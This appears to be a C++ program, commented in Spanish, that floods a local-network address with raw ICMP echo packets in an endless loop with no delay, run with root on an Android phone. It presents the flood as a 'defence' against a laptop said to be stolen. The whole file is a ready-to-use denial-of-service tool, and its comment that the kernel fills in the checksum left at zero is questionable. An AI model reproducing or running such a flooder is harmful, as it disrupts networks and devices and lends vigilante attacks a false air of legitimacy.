#include <iostream>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>

// Configuración de Saturación (Target: Laptop/PC Robada)
const char* TARGET_IP = "192.168.1.XX"; // Se obtiene del radar del E13

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        std::cerr << "[!] Error: Requiere privilegios Root (Magisk)." << std::endl;
        return 1;
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, TARGET_IP, &dest.sin_addr);

    char packet[64];
    memset(packet, 0, sizeof(packet));
    struct icmp* icmph = (struct icmp*)packet;
    icmph->icmp_type = ICMP_ECHO;
    icmph->icmp_code = 0;
    icmph->icmp_cksum = 0; // El kernel lo calcula o se añade rutina

    std::cout << "[🔥] INICIANDO INUNDACIÓN DE DEFENSA SOBRE: " << TARGET_IP << std::endl;

    while(true) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest));
        // Sin delay para máxima saturación del Unisoc T606
    }

    return 0;
}
